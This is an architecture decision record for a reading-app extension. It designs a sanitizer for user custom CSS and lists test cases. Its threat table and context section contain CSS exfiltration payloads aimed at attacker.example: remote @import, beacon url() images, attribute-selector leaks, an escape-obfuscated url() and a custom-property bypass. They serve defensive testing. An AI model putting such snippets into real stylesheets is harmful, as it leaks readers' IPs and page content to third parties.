# ADR-0009: User Custom CSS — Injection Surface & Sanitization

- Status: Proposed (2026-09-28) — Phase 12 must not start until this is
  Accepted
- Date: 2026-09-28
- Related: `docs/specs/02-feature-matrix.md` F87 (and F86, the curated
  reading surfaces this feature sits next to); `docs/specs/04-security-privacy.md`
  §2 ("CSS-based data exfiltration or UI redress" — already named in the
  threat model), §3; `docs/specs/01-functional-requirements.md` §26, §32;
  ADR-0002 (the "`wasm-unsafe-eval` is the only CSP relaxation, ever" rule);
  ADR-0004 (storage schema/migration); ADR-0008 (the "never build a second,
  weaker sanitizer" rule)

## Context

A user-supplied custom-CSS box is a standard power-user affordance for a
reading app, and is the one unimplemented item in the 2026-09-28 audit that
cannot be scoped as "a settings field plus some styles". Three constraints
collide:

1. **The project's CSP stance.** `.claude/rules/security-privacy.md` rule 7
   and ADR-0002 commit the product to extension pages without
   `unsafe-inline`, with `wasm-unsafe-eval` as the single documented
   exception. The obvious implementation — writing the user's CSS into a
   `<style>` element — is exactly what `style-src 'unsafe-inline'` exists to
   permit, and an extension page's CSP is static in the manifest, so a
   per-load nonce is not available either.

   *Finding recorded honestly:* the CSP shipped today
   (`content_security_policy.extension_pages: "script-src 'self'
   'wasm-unsafe-eval'; object-src 'self'"`) declares **no `style-src`
   directive at all**, so inline `<style>` is not actually blocked right now.
   That is a gap in the current manifest, not a licence to depend on it. This
   ADR deliberately picks an approach that keeps working if `style-src 'self'`
   is later added, rather than one that would have to be un-built.

2. **CSS is an exfiltration channel, not just decoration.** The threat model
   in `04-security-privacy.md` §2 already lists "CSS-based data exfiltration
   or UI redress". The realistic attack is not the user attacking themself —
   it is the user pasting a "nice reading theme" snippet found online, which
   then contains `@import url(https://attacker.example/x.css)` or
   `background: url(https://attacker.example/beacon.png)`. Both fire a request
   from the reader's browser revealing IP, timing, and (via attribute
   selectors keyed on document content or UI state) selected bits of what is
   being read. That is precisely the "silent network feature" that
   `.claude/rules/security-privacy.md` rule 6 forbids.

3. **Nothing in the document may gain new power.** Custom CSS is authored in
   the settings UI by the user; document content must never be able to reach
   it, and the feature must never become a way for a document to style or
   hide extension chrome.

## Decision

### 1. Constructed stylesheets, not `<style>`, not `<link>`

User CSS is applied with a **constructed stylesheet**:

```text
const sheet = new CSSStyleSheet();
sheet.replaceSync(sanitizedCss);
root.adoptedStyleSheets = [...baseSheets, sheet];
```

Rationale, and the two properties this buys:

- **CSP.** CSP's `style-src` governs *markup-originated* styles — `<style>`
  elements, `<link rel=stylesheet>` fetches and `style=` attributes. Styles
  introduced through the CSSOM (`CSSStyleSheet` construction,
  `replace`/`replaceSync`, `insertRule`, `element.style.*`) are not fetches or
  elements and are not subject to `style-src`; CSP has never governed CSSOM
  mutation. This is what lets Phase 12 ship user CSS **and** lets a later
  hardening pass add `style-src 'self'` to the manifest without breaking it.
- **`@import` is structurally impossible.** Per the CSSOM specification's
  `replace()`/`replaceSync()` steps, `@import` rules in the supplied text are
  **ignored/dropped** for a constructed stylesheet — the one at-rule with a
  mandatory network fetch cannot survive into an adopted sheet even if the
  sanitizer were bypassed.

Adoption is **atomic and reversible**: turning the feature off, clearing the
box, or hitting the kill switch is one `adoptedStyleSheets` reassignment, with
no DOM element to hunt down and no cascade residue.

**Phase 12 verification obligation (mirrors ADR-0002's Graphviz/WASM
precedent):** before writing feature code, confirm against the current Chrome
stable build that (a) `replaceSync` on a constructed sheet is unaffected by a
`style-src 'self'` extension-page CSP, and (b) `@import` is in fact dropped.
Record the result in `DEVELOPMENT.md`. If (a) turns out false on the shipped
Chrome version, the feature does not ship — it does **not** get a CSP
relaxation.

### 2. The sanitization gate — two passes, the CSSOM one is authoritative

**Pass A — text pre-scan (fast user feedback only).** Reject on `@import` or
on a `url(` token whose target is not permitted, and surface a specific,
translated error in the settings UI naming the offending construct. This pass
exists so the user gets a useful message, and is explicitly **not** the
security boundary — CSS escapes (`u\72 l(...)`, `\40 import`), comments and
whitespace make raw-text matching defeatable.

**Pass B — parsed-CSSOM walk (the actual gate).** Construct the sheet in an
**unadopted** state (an unadopted constructed sheet applies to no document, so
no resource in it is ever fetched), then walk `cssRules` recursively and
inspect the browser's own canonical serialization of every declaration value.
Escapes are already normalized by the parser at this point, so this pass sees
what will really be applied. Only if it passes is the sheet adopted;
otherwise it is discarded and the previous sheet stays in force.

The walk must recurse into **every** rule type that can nest declarations or
further rules: `@media`, `@supports`, `@layer`, `@container`, `@scope`, CSS
nesting, `@font-face`, `@keyframes`, `@page`, `@property` (its
`initial-value` can carry an `<image>`), plus plain style rules.

Rules enforced by pass B:

| # | Construct | Verdict |
|---|---|---|
| 1 | `@import` | Rejected (and already dropped by `replaceSync` — belt and braces) |
| 2 | Any `url()` whose target is not a `data:` URL or a bare same-document fragment (`url(#filterId)`) | Rejected. This is one rule covering `background`/`background-image`, `border-image`, `list-style-image`, `cursor`, `mask`/`mask-image`, `content`, `filter`, `shape-outside`, `@font-face { src: }`, and any property added to the platform later — the check is on the value, not on an allowlist of property names |
| 3 | Image-producing functions that can wrap a remote URL — `image-set()`, `-webkit-image-set()`, `cross-fade()`, `element()`, `paint()`, `src()` | Rejected unless every URL inside them satisfies rule 2 |
| 4 | **Custom properties** (`--x: url(https://…)`) | Subject to rules 2–3 as well. Custom-property values are parsed as untyped token streams and only resolve when `var()` lands in a URL-accepting property — skipping them would leave the simplest bypass in the feature |
| 5 | `@font-face` with a remote `src` | Rejected by rule 2. Bundled fonts remain reachable through the existing typography settings (F35); a remote web font here would also contradict `04-security-privacy.md` §1's "bundle fonts, don't CDN them" |
| 6 | Anything the browser's parser did not understand | Already gone — the parser drops invalid rules/declarations, so they never reach the walk and never reach the page |
| 7 | Sheet size over the cap (**64 KB** of CSS text) | Rejected with a size-specific message, before parsing |

Legacy script-from-CSS vectors (`expression()`, `behavior:`, `-moz-binding`)
are not separately enumerated: none parse in current Chromium, so rule 6
disposes of them. They are listed in the threat table below so the tests
assert it rather than assume it.

### 3. Scope: the rendered document, not the app

The adopted sheet is applied **only to the viewer's rendered-content root**,
not to the popup, the settings page, the toolbar/sidebars, the notification
(toast) layer, or any modal. Consequences that make this non-negotiable:

- The settings page — where the CSS is edited and where the disable switch
  lives — is never styled by the CSS it edits, so a user cannot lock
  themselves out with a snippet that hides the off switch.
- Disclosure UI that the security rules require to stay visible (the PlantUML
  opt-in notice, export/consent dialogs) is outside the sheet's reach.

**Residual risk, stated rather than hidden:** CSS applied inside the content
root can still use `position: fixed` and large `z-index` values to paint over
surrounding chrome. Mitigations are (a) the content root carries a stacking
context and the app chrome renders above it, (b) the feature is off by
default with an always-available kill switch that does not depend on the
styled surface, and (c) the settings UI carries a plain-language warning that
custom CSS should only be pasted from sources the user trusts. This is
accepted, documented residual risk — not a claim of complete containment.

### 4. Provenance: user-authored only

The CSS comes from one place — the settings UI — and is stored in
`chrome.storage.local` through the typed wrapper (`src/backend/storage/`) as
a new `Settings` field, with the ADR-0004 schema-version bump and migration
entry. It is never sourced from, influenced by, or reachable from document
content, a URL parameter, the clipboard on the document's behalf, drag-drop,
or a message from a content script. There is no "import theme from URL"
affordance; importing a settings JSON that contains custom CSS re-runs the
full sanitization gate before the value is stored (F42's import path already
validates shape — this adds a value-level check).

### 5. Exports and other surfaces

Custom CSS is **not** carried into HTML, print/PDF or DOCX export, and not
into the F84 rich clipboard payload. It is a local reading preference; baking
a user's arbitrary CSS into a file they hand to someone else would ship
attacker-influenceable CSS into a document Markora vouches for. Documented as
a deliberate limitation, not an oversight.

### 6. Off by default

The field ships empty and the feature toggle ships off. Users who want a
different reading surface without writing CSS are served by F86's curated
sepia/paper surfaces and the existing high-contrast toggle — the safe path is
also the default path.

## Threat cases this defends against (all become Phase 12 security tests)

| Input | Expected result |
|---|---|
| `@import url("https://attacker.example/x.css")` | Rejected by pass A with a named error; dropped by `replaceSync` even if pass A is bypassed; zero network requests (Playwright network assertion) |
| `body { background: url("https://attacker.example/beacon.png") }` | Rejected by rule 2; no request |
| `a[href^="https://internal"] { background: url("https://attacker.example/leak") }` | Rejected by rule 2 — this is the canonical CSS-exfiltration shape from `04-security-privacy.md` §2 |
| `@font-face { font-family: x; src: url("https://attacker.example/f.woff2") }` | Rejected by rules 2/5 |
| `:root { --leak: url("https://attacker.example/p.png") } .md img { content: var(--leak) }` | Rejected by rule 4 (custom-property values are inspected) |
| `background: u\72 l("https://attacker.example/x.png")` | Passes pass A's naive text match if it ever regresses; **rejected by pass B**, which reads the parser's normalized serialization |
| `background: image-set(url("https://attacker.example/x.png") 1x)` | Rejected by rule 3 |
| `background: url("data:image/png;base64,…")` | **Allowed** — no network egress |
| `filter: url(#myBlur)` | **Allowed** — same-document fragment reference |
| `body { behavior: url(x.htc) }` / `-moz-binding` / `expression(alert(1))` | Never parses in Chromium; asserted to produce no rule and no execution (rule 6) |
| A document containing `<style>` or a `style=` attribute trying to reach the custom-CSS sheet | Unchanged and unrelated: document content is still DOMPurify's problem, and can never write to the settings-owned sheet (§4) |
| 5 MB of CSS pasted in | Rejected by rule 7 before parsing; no UI freeze |
| CSS that hides the settings page's "disable custom CSS" control | Impossible — the settings page is out of the sheet's scope (§3) |

## Security/Privacy impact

- **Net new egress surface: none by design.** Every construct capable of
  originating a network request from CSS (`@import`, any non-`data:` `url()`,
  remote `@font-face`, image-producing functions wrapping a URL) is rejected
  before adoption, so the feature adds no path that could carry reader IP,
  timing or document-derived state off-device. The privacy guarantee in
  `04-security-privacy.md` §1 stays unconditional; no new entry is added to
  its exceptions list.
- **No CSP change.** `content_security_policy.extension_pages` is untouched;
  ADR-0002's "one relaxation, ever" rule holds. The decision is forward-
  compatible with adding `style-src 'self'`.
- **No new permission.** Nothing in this feature touches `manifest.json`
  `permissions`, `host_permissions` or `optional_host_permissions`.
- **Storage stays local.** One new `chrome.storage.local` field via the typed
  wrapper; never `sync`, never exported anywhere but the user's own settings
  JSON (F42), which re-validates on import.
- **Residual risk:** in-content-root visual overlay/UI-redress, bounded as
  described in §3 and carried into the product's known-limitations list.

## Testing/Verification impact

- **Unit:** the sanitizer, one test per row of both the rules table and the
  threat table, including the escape-obfuscation case and each nesting
  container (`@media`/`@supports`/`@layer`/`@container`/`@scope`/nesting/
  `@property`).
- **Security (Playwright):** load a document with custom CSS enabled and each
  hostile snippet applied, asserting **zero requests** to any host not present
  in the open document — reusing the Phase 9 network-audit harness
  (`e2e/phase9-network-audit.spec.ts`).
- **Integration:** enable → apply → reload persistence; disable restores
  baseline styling with no residue; settings page remains fully usable and
  unaffected while hostile CSS is active; a rejected snippet leaves the
  previously-adopted sheet in force and shows a translated error.
- **Export:** HTML/print/DOCX output and the F84 clipboard payload are
  byte-identical with custom CSS on and off (§5).
- **Environment spike:** the Chrome-version check from §1, recorded in
  `DEVELOPMENT.md` before feature code is written.
- **a11y:** custom CSS must not be able to suppress focus indicators on app
  chrome (out of scope by §3); the settings editor itself is keyboard- and
  screen-reader-accessible, with errors announced via the existing
  notification component.

## Consequences

- Phase 12 is gated on this ADR being Accepted **and** on its §1 spike
  passing; it is not schedulable as ordinary feature work.
- The product gains a user-facing limitation to document: no remote images,
  fonts or stylesheets in custom CSS, at all, with the reason stated
  (exfiltration) rather than presented as an arbitrary restriction.
- `data:`-URL images are the only image escape hatch, which is a real
  ergonomic cost for anyone wanting a background image. Accepted: a
  base64 background is inconvenient, a beacon is not recoverable.
- Two sanitization passes with different jobs (message quality vs. security)
  must stay clearly labelled in code, or a future maintainer will "simplify"
  by deleting the CSSOM pass — the one that matters.
- If a later phase wants custom CSS in exports, that reverses §5 and is a new
  decision, not an incidental feature toggle.

## Alternatives considered

- **`<style>` element with the user's CSS**: rejected — it is the construct
  `style-src 'unsafe-inline'` exists to gate; it would either require
  weakening the CSP (breaking ADR-0002's one-exception rule) or would silently
  depend on today's missing `style-src` directive, blocking the manifest
  hardening this ADR wants to keep possible.
- **`<link rel="stylesheet" href="blob:…">`**: rejected — creates a real
  stylesheet *fetch*, therefore needs `style-src blob:`, and reintroduces the
  fetch pathway the whole design is trying to eliminate.
- **`insertRule()` into an existing document stylesheet**: CSP-equivalent to
  the chosen approach, but rejected — it mutates a shared sheet, has no atomic
  replace/revert, makes scoping to the content root awkward, and leaves
  cascade residue when disabled.
- **Sanitize with a third-party CSS parser (PostCSS or similar)**: rejected —
  bundle cost, plus a parser-differential risk: the sanitizer would be reading
  a different parse than the browser actually applies. ADR-0008's rule ("never
  become a second, weaker sanitizer competing with the real one") applies
  directly; using the browser's own CSSOM makes the gate and the renderer the
  same parser by construction.
- **Allow remote `url()`/`@import` behind a warning or an opt-in toggle**:
  rejected — `.claude/rules/security-privacy.md` rule 6 permits a disclosed
  opt-in for a *feature* that needs the network (PlantUML). "Let arbitrary
  pasted CSS phone home" is not a feature with a purpose; the user cannot
  meaningfully consent to an egress channel whose payload is chosen by
  whoever wrote the snippet.
- **Render the document in a sandboxed iframe so hostile CSS is contained**:
  rejected for the same reason ADR-0002 rejected Mermaid's sandbox mode —
  annotations, TOC/scroll-spy, in-document search, lightbox and export all
  need same-context DOM access.
- **No free-form CSS at all; ship only a curated theme-variable editor**:
  seriously considered, and it is what F86 delivers for the common case. Kept
  as the default experience, but rejected as the *whole* answer: the audit
  item is specifically arbitrary custom CSS, and a variable editor cannot
  express layout tweaks power users ask for.
